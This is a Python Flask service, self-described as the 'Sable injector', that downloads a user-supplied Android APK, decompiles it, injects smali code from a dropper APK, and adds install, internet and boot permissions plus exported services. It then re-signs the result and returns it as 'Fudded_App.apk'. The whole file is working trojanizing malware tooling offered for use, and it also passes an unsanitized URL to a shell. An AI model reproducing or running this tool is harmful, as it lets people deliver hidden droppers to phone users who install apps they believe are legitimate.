import os
import subprocess
import shutil
import tempfile
from flask import Flask, request, send_file, jsonify

app = Flask(__name__)
WORK = tempfile.mkdtemp()
KEYSTORE = "keystore.jks"
DROPPER = "dropper_base.apk"

@app.route("/")
def home():
    return "Sable injector alive"

@app.route("/inject", methods=["POST"])
def inject():
    data = request.json or {}
    file_url = data.get("apk_url")
    if not file_url:
        return jsonify({"error": "apk_url required"}), 400
    
    # 1. Target APK download kar (jo user ne bheja)
    target = os.path.join(WORK, "target.apk")
    subprocess.run(f"wget -q -O {target} '{file_url}'", shell=True)
    
    # 2. Target APK ko decompile kar
    target_dir = os.path.join(WORK, "target")
    shutil.rmtree(target_dir, ignore_errors=True)
    subprocess.run(f"apktool d -f -o {target_dir} {target}", shell=True)
    
    # 3. Tera [yes] APK (dropper) decompile kar
    dropper_dir = os.path.join(WORK, "dropper")
    shutil.rmtree(dropper_dir, ignore_errors=True)
    subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True)
    
    # 4. Dropper ki saari smali files target me copy kar
    src_smali = os.path.join(dropper_dir, "smali")
    dst_smali = os.path.join(target_dir, "smali")
    if os.path.exists(src_smali):
        shutil.copytree(src_smali, dst_smali, dirs_exist_ok=True)
    
    # 5. Manifest merge kar (permissions aur services add karne ke liye)
    merge_manifest(os.path.join(target_dir, "AndroidManifest.xml"), os.path.join(dropper_dir, "AndroidManifest.xml"))
    
    # 6. Wapas APK build kar
    unsigned = os.path.join(WORK, "unsigned.apk")
    subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True)
    
    # 7. Sign aur Align kar
    aligned = os.path.join(WORK, "aligned.apk")
    signed = os.path.join(WORK, "signed.apk")
    subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True)
    subprocess.run(f"apksigner sign --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True)
    
    return send_file(signed, as_attachment=True, download_name="Fudded_App.apk")

def merge_manifest(target_path, dropper_path):
    with open(target_path) as f:
        t = f.read()
    
    # Target me Internet aur Install permission add kar
    perms = ["android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.RECEIVE_BOOT_COMPLETED","android.permission.WAKE_LOCK"]
    insert = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
    if insert:
        t = t.replace("</application>", insert + "</application>")
    
    # [yes] APK ke Manifest se services aur receivers nikal kar target me daal
    with open(dropper_path) as f:
        d = f.read()
    
    import re
    components = re.findall(r'<(?:service|receiver|activity)[^>]*android:name="([^"]+)"[^>]*>', d)
    
    comp_str = ""
    for comp in components:
        if "com." in comp and "sable" not in comp: # Dropper ke custom classes uthayega
            comp_str += f'<service android:name="{comp}" android:exported="true"/>'
            
    t = t.replace("</application>", comp_str + "</application>")
    
    with open(target_path, "w") as f:
        f.write(t)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
